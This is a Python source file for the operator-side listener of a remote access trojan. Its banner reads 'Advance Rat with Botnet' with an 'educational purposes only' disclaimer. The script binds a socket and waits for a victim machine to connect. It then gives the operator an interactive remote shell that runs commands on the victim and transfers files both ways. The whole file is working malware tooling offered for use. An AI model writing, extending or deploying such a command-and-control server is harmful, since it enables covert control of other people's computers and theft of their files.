#!/usr/bin/python

import socket
import argparse
import json
import base64
import os
import sys
from colorama import Fore, Back, Style


# ASCII art banner
BANNER = '''

  ██████ ▄▄▄█████▓ ▒█████   ▒█████   ██▓     ██▓    
▒██    ▒ ▓  ██▒ ▓▒▒██▒  ██▒▒██▒  ██▒▓██▒    ▓██▒    
░ ▓██▄   ▒ ▓██░ ▒░▒██░  ██▒▒██░  ██▒▒██░    ▒██░    
  ▒   ██▒░ ▓██▓ ░ ▒██   ██░▒██   ██░▒██░    ▒██░    
▒██████▒▒  ▒██▒ ░ ░ ████▓▒░░ ████▓▒░░██████▒░██████▒
▒ ▒▓▒ ▒ ░  ▒ ░░   ░ ▒░▒░▒░ ░ ▒░▒░▒░ ░ ▒░▓  ░░ ▒░▓  ░
░ ░▒  ░ ░    ░      ░ ▒ ▒░   ░ ▒ ▒░ ░ ░ ▒  ░░ ░ ▒  ░
░  ░  ░    ░      ░ ░ ░ ▒  ░ ░ ░ ▒    ░ ░     ░ ░   
      ░               ░ ░      ░ ░      ░  ░    ░  ░
                                                                                
    [+] Advance Rat with Botnet [+]                                            
    [+] For Educational Purposes Only [+]                                        
    [+] Use Responsibly [+]                                                      
    [+] Created by iDOR [+]                                                                                                                            
    [===> CYBERNETIC INFILTRATION SUCCESS <===]
'''


# Function to display banner
def display_banner():
    print(Fore.GREEN + BANNER)

# Clear the screen
os.system('clear')

# Display the banner when the script runs
display_banner()

# Function to display menu
def display_menu():
    print(Fore.GREEN + "1. Start Server" + Style.RESET_ALL)
    print(Fore.GREEN + "2. Stop Server" + Style.RESET_ALL)
    print(Fore.RED + "3. Exit" + Style.RESET_ALL)

# Main Server function
def server(ip, port):
    global target
    global address
    global listner
    
    listner = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    listner.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    listner.bind((ip, int(port)))
    listner.listen(0)
    print(Fore.LIGHTGREEN_EX + '[+] Listening on ' + ip + ':' + port + '...' + Style.RESET_ALL)
    target, address = listner.accept()
    print(Fore.LIGHTGREEN_EX + f'[+] Got Connection From: {address[0]}:{address[1]}' + Style.RESET_ALL)
    

# Send Function
def send(data):
	json_data = json.dumps(data)
	target.send(json_data.encode('utf-8'))


# Recieve Function
def recieve():
	json_data = ''
	while True:
		try:
			json_data += target.recv(1024).decode('utf-8')
			return json.loads(json_data)
		except ValueError:
			continue


# Run Command Function
def run():
    while True:
        command = input(Fore.LIGHTBLUE_EX + "* Shell#~%s " % str(address)  + Style.RESET_ALL)
        ## If there is no command then no execute or processing
        if not command:
            continue
        send(command)

        if command == 'exit':
            break
        elif command[:8] == 'download':
            with open(command[9:], 'wb') as f:
                file_data = recieve()
                f.write(base64.b64decode(file_data))
        elif command[:6] == 'upload':
            try:
                with open(command[7:], 'rb') as fin:
                    send(base64.b64encode(fin.read()).decode('utf-8'))
            except Exception as e:
                failed = f"Failed to Upload: {e}"
                send(failed)
        else:
            result = recieve().encode('utf-8')
            print(Fore.LIGHTCYAN_EX + f'\n{result.decode('utf-8')}' + Style.RESET_ALL)


# Main Function
def main():
    parser = argparse.ArgumentParser(description="Basic Reverse Shell Server")
    parser.add_argument('ip', help="Ip address of you server (e.g., 192.168.1.14)")
    parser.add_argument('port', help="Port of your server (e.g., 4444)")
    
    args = parser.parse_args()

    display_menu()

    while True:
        sys.stdout.write(f"\nEnter Option: ")
        sys.stdout.flush()
        choice = input()
        
        if choice == '1':
            server(args.ip, args.port)
            run()
        elif choice == '2':
            listner.close()
        elif choice == '3':
            sys.exit()

if __name__ == "__main__":
	main()